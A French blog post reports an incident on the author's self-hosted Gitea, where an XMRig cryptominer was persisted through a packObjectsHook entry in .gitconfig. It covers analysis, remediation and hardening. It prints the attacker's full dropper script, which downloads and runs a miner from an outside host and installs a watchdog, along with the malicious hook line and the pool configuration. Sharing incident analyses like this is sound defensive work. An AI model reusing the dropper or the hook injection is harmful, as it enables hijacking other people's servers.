---
title: "Incident : XMRig injecté dans mon Gitea via packObjectsHook"
date: 2026-09-19T18:00:00+00:00
draft: false
tags: ["cybersecurity", "homelab", "selfhosted", "infosec", "blue-team", "soc", "incident-response", "gitops", "debutant-en-cyber", "apprendre-la-cyber", "build-in-public", "french-tech"]
summary: "Mon Gitea auto-hébergé a été compromis par un cryptominer XMRig déployé via le mécanisme git packObjectsHook. Retour d'expérience sur la détection, l'analyse et la remédiation."
description: "Analyse d'un incident de sécurité réel : injection de XMRig dans Gitea via packObjectsHook dans .gitconfig — vecteur, persistence, remédiation et mise à jour vers 1.27.3."
author: "Bojemoi"
ShowToc: true
ShowReadingTime: true
---

Mon CI/CD Hugo tombait en échec depuis un mois. Je pensais à un bug de runner. C'était un miner Monero.

## Le symptôme

Le workflow Gitea Actions du blog échouait à l'étape `git clone` avec exit code 128 :

```
remote: wget: can't open '/data/gitea/.sys_health_s3': Text file busy
remote: curl: (23) client returned ERROR on write of 16212 bytes
fatal: early EOF
fatal: fetch-pack: invalid index-pack output
```

`Text file busy` sur un fichier caché dans `/data/gitea/`. Pas un bug de runner.

## L'analyse

### Les fichiers

Dans `/data/gitea/home/` (le home du user `git` dans le container Gitea) :

```
-rwxr-xr-x  8.3M  .sys_health_s3       ← ELF64 statically linked
-rwxr-xr-x   156  .wp_s2_cron          ← shell script watchdog
-rw-r--r--  1.2K  .sys_health_s3.json  ← config XMRig
-rw-r--r--     0  .s3w                  ← lock file
           p0_f3959c2a.sh               ← dropper
```

`file .sys_health_s3` : `ELF 64-bit LSB executable, x86-64, statically linked, stripped` — 8.3 MB. XMRig classique.

La config confirme :

```json
{
  "pools": [
    {"url": "gulf.moneroocean.stream:443",
     "user": "45ZSHJTQigW7gLTgpjCyCzCfENpNjFoWeE8vADaD3e3g9664KAqra3m4tbSJeNVtiF3zK4VgrA7caHxwgABX4T4H88gGC4b",
     "pass": "Gitea S2", "rig-id": "Gitea S2"}
  ]
}
```

Rig-id `Gitea S2` — l'attaquant a nommé le rig d'après le service. Vraisemblablement d'autres machines compromises avec le même pattern (`Gitea S1`, `S3`...).

### Le vecteur de persistence

Le plus intéressant : `.gitconfig` du user `git` dans le container.

```ini
[uploadpack]
    packObjectsHook = sh /data/gitea/home/p0_f3959c2a.sh ;#router: completed POST /api/internal/manager/add-logger ...
```

`packObjectsHook` est un hook git légitime appelé pendant `git upload-pack`, c'est-à-dire à **chaque `git clone`, `git fetch`, `git pull`** sur le serveur. L'attaquant l'a utilisé pour réexécuter le dropper à chaque opération git.

Les faux commentaires imitant des logs Gitea (`#router: completed GET /bojemoi/blog/src/...`) sont un camouflage : ils rendent l'entrée `.gitconfig` difficile à repérer dans un diff ou un log.

### Le dropper (`p0_f3959c2a.sh`)

```sh
D=; for x in /data/gitea /data/git /home/git /var/tmp /dev/shm /tmp; do
  touch $x/.s3w 2>/dev/null && D=$x && break
done
[ -n "$D" ] || D=/tmp
B=$D/.sys_health_s3
C=$D/.sys_health_s3.json

# Téléchargement du miner
(wget -qO $B https://sunnyeye.solarvest.my/health.bin || \
 curl -fsSL --max-time 60 -o $B https://sunnyeye.solarvest.my/health.bin)
(wget -qO $C https://sunnyeye.solarvest.my/p0_gitea_s2.json || \
 curl ...)

chmod +x $B
SZ=$(wc -c <$B 2>/dev/null || echo 0)

if [ "$SZ" -gt 1000000 ]; then
  pkill -f '[.]sys_health_s3' 2>/dev/null
  nohup $B --config=$C >/dev/null 2>&1 &
  # Install watchdog (cron ou boucle shell)
  W=$D/.wp_s2_cron
  printf '%s\n' '#!/bin/sh' \
    "pgrep -f '[.]sys_health_s3 --config' >/dev/null 2>&1 || nohup $B --config=$C >/dev/null 2>&1 &" > "$W"
  chmod +x "$W"
  # Sur ce système, pas de cron → boucle while
  nohup sh -c "while sleep 180; do $W; done" >/dev/null 2>&1 &
fi
```

Le script détecte si cron est disponible et installe la persistence en conséquence. Ici, sans crond, il a déployé un watchdog `while sleep 180`.

Le `wget` qui échoue à écrire sur un binaire déjà en cours d'exécution (lock OS sur ELF chargé) produit l'erreur `Text file busy` — qui se retrouve dans le flux `git upload-pack` et corrompt le protocole git côté client.

### Pourquoi le CI échouait

```
git clone → git upload-pack (serveur) → packObjectsHook → p0_f3959c2a.sh
→ wget tente de réécrire .sys_health_s3 déjà en cours d'exécution
→ "Text file busy" sur stderr
→ stderr injecté dans le flux pack-objects
→ client git : "fatal: early EOF" / "invalid index-pack output"
→ exit 128
```

Le miner se sabotait lui-même en essayant de se re-télécharger à chaque clone.

## La remédiation

### Immédiat

```bash
# 1. Tuer les processus
kill -9 $(ps aux | grep "while sleep 180" | grep -v grep | awk '{print $2}')
pkill -f sys_health_s3

# 2. Supprimer les fichiers
rm -f /data/gitea/.sys_health_s3 .wp_s2_cron .sys_health_s3.json .s3w .wp_s2_wd.pid
rm -f /data/gitea/home/p0_f3959c2a.sh

# 3. Nettoyer .gitconfig
# Supprimer toutes les sections [uploadpack] packObjectsHook
python3 -c "
lines = open('.gitconfig').readlines()
clean = [l for l in lines if 'packObjectsHook' not in l]
# Supprimer les sections [uploadpack] orphelines
# ...
open('.gitconfig', 'w').writelines(clean)
"

# 4. Redémarrer Gitea
docker restart gitea
```

### Vérification

```bash
# .gitconfig propre ?
grep -c packObjectsHook /data/gitea/home/.gitconfig
# → 0

# git clone fonctionne ?
docker run --rm --network gitea_gitea-internal alpine \
  sh -c "apk add git -q && git clone http://gitea:3000/bojemoi/blog.git /tmp/t && echo OK"
# → OK
```

### Mise à jour Gitea

La version 1.25.3 (installée depuis 9 mois sur tag `latest`) présentait probablement une vulnérabilité permettant l'injection dans `.gitconfig`. Mise à jour vers **1.27.3** et épinglage du tag dans le `docker-compose.yml` :

```yaml
services:
  gitea:
    image: gitea/gitea:1.27.3  # plus "latest"
```

## Ce que j'aurais dû faire

- **Épingler les versions** des images Docker dès le départ — `latest` masque les mises à jour automatiques ET empêche de savoir quelle version tourne
- **Surveiller les fichiers cachés** dans les volumes Docker (script cron, `find /data -name ".*" -newer /etc/passwd`)
- **Alertes CPU** — un miner consomme en permanence. J'ai Prometheus/Grafana, j'aurais dû avoir une alerte `node_cpu_usage > 80%` sur le Lightsail

Le CI qui échoue n'est pas toujours un bug de code.

## Protections mises en place

### 1. `.gitconfig` immuable

```bash
chattr +i /data/gitea/home/.gitconfig
```

`chattr +i` positionne le flag immuable au niveau du filesystem. Même `root` ne peut plus écrire dans ce fichier sans retirer le flag d'abord — aucun process dans le container ne peut le modifier. C'est la protection la plus directe contre ce vecteur spécifique.

```bash
lsattr /data/gitea/home/.gitconfig
# → ----i----------------- .gitconfig

echo "test" >> /data/gitea/home/.gitconfig
# → Operation not permitted
```

### 2. Durcissement `app.ini`

```ini
[security]
IMPORT_LOCAL_PATHS = false   ; bloque l'import de repos locaux (LFI)
DISABLE_GIT_HOOKS = true     ; Gitea refuse d'exécuter les hooks serveur
```

`DISABLE_GIT_HOOKS` empêche Gitea d'exécuter les hooks `pre-receive`, `update` et `post-receive` dans les repos — vecteur distinct du `packObjectsHook` mais dans la même famille.

### 3. Firewall sortant — bloquer les pools mining

```bash
# Ports stratum standard
iptables -A OUTPUT -p tcp --dport 3333 -j DROP
iptables -A OUTPUT -p tcp --dport 5555 -j DROP
iptables -A OUTPUT -p tcp --dport 10001 -j DROP
iptables -A OUTPUT -p tcp --dport 14444 -j DROP

# IPs des pools connus dans cette config
iptables -A OUTPUT -d 103.7.55.233 -j DROP   # gulf.moneroocean.stream
iptables -A OUTPUT -d 185.84.98.85 -j DROP   # pool.hashvault.pro
iptables -A OUTPUT -d 185.84.98.5  -j DROP

iptables-save > /etc/sysconfig/iptables
```

Même si un miner est déposé, il ne peut pas rejoindre un pool. La règle couvre aussi le TLS sur 443 vers ces IPs spécifiques.

### 4. Surveillance continue — cron toutes les 5 minutes

```bash
#!/bin/bash
# /usr/local/bin/gitea-watch.sh
GITEA_HOME="/home/docker/stacks/gitea/data/gitea"

# Nouveaux fichiers cachés récents
find "$GITEA_HOME" -maxdepth 3 -name ".*" -type f -newer /tmp/.gitea-watch-last \
  | grep -v ".gitconfig$" | while read f; do
    echo "$(date -u) ALERT: nouveau fichier caché: $f" >> /var/log/gitea-security.log
done

# .gitconfig modifié (ne devrait jamais changer avec chattr +i)
MTIME=$(stat -c %Y "$GITEA_HOME/home/.gitconfig")
[ "$MTIME" != "$(cat /tmp/.gitconfig-mtime 2>/dev/null)" ] && \
  echo "$(date -u) ALERT: .gitconfig modifié!" >> /var/log/gitea-security.log

# Processus suspects
for pat in sys_health wp_s2_cron xmrig; do
    pgrep -f "$pat" > /dev/null && \
      echo "$(date -u) ALERT: processus suspect: $pat" >> /var/log/gitea-security.log
done

# Connexions vers ports mining
ss -tnp | grep -E ":3333|:5555|:10001|:14444" | grep -v LISTEN && \
  echo "$(date -u) ALERT: connexion mining" >> /var/log/gitea-security.log

touch /tmp/.gitea-watch-last
```

### 5. Token runner invalidé

Le token de registration runner était en clair dans le `docker-compose.yml`. Remplacé par une valeur aléatoire — le runner existant conserve son enregistrement, mais personne ne peut en enregistrer un nouveau avec l'ancien token.

---

**Bilan** :

| Mesure | Vecteur bloqué |
|--------|----------------|
| `chattr +i .gitconfig` | Injection `packObjectsHook` |
| `DISABLE_GIT_HOOKS` | Hooks repo server-side |
| `IMPORT_LOCAL_PATHS = false` | LFI via import local |
| Gitea 1.27.3 | CVEs corrigées |
| iptables DROP ports/IPs mining | Connexion pool impossible |
| Cron surveillance `*/5` | Détection rapide re-infection |
| Token runner changé | Enregistrement runner parasite |

---

*Gitea 1.27.3, XMRig supprimé, packObjectsHook nettoyé, 7 protections actives.*
